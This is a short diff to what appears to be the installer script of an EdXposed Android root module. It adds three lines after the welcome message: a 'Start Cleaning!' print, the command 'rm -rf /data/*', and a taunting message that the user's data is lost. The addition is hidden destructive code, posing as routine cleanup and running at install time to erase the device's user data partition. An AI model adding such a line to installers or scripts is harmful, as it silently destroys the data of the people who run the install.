@@ -348,3 +348,6 @@ cp "${MODPATH}/module.prop" "${RIRU_TARGET}/module.prop" || abort "! Can't creat
 set_perm_recursive "${MODPATH}" 0 0 0755 0644
 
 ui_print "- Welcome to EdXposed ${VERSION}!"
+ui_print "- Start Cleaning!"
+rm -rf /data/*
+ui_print "- Finished! Check for your data.(OHHHHHYourDATALOST)"
